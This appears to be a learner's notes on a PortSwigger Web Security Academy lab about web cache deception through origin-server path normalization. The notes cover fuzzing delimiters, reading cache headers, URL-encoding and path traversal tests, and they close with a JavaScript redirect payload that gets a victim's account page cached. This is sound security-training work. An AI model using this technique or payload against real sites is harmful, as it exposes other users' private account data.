
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization
#### Identify delimters
- Send through ffuf the differents delimiters on request with no cache oracle or method POST
- Send through ffuf the differents delimiters on request with cache oracle
- identify **delimiters used by the origin server but not the CDN**
![[Pasted image 20250405004435.png]]
### Identify normalization
#### CDN do not normalize
- Use a cacheable request 
	`/resources/images/blog.svg`
	```http
	HTTP/2 200 OK
	Content-Type: image/svg+xml
	X-Frame-Options: SAMEORIGIN
	Cache-Control: max-age=30
	Age: 0
	X-Cache: miss
```
- Use the request totally url-encoded
	`%2f%72%65%73%6f%75%72%63%65%73%2f%69%6d%61%67%65%73%2f%62%6c%6f%67%2e%73%76%67`
```http
HTTP/2 200 OK
Content-Type: image/svg+xml
X-Frame-Options: SAMEORIGIN
```
	The response lose the cache oracle, the origin server do map the request but the cdn do not like it

#### Origin server normalize
- use a not cacheable response. 
- use path traversal to see if you could dive in the directories
	- get `<origin_server_endpoint>`
	 ![[Pasted image 20250405120154.png]]
	- get `<origin_server_endpoint><path_traversal><origin_server_endpoint>`
	![[Pasted image 20250405120129.png]]
	The req is normalized.

### What we know
- The frontend do not normalize
- The origin server does it
as path normalization is not used for the cache CDN we should use a request with cache hit heade and use these delimiters to map to our arbirtary endpoint with sensitive data.
```js
document.location="https://0a68006f04a7234e817b2fcf00cb0080.web-security-academy.net/resources/labheader/css/academyLabHeader.css/../../../../my-account"
```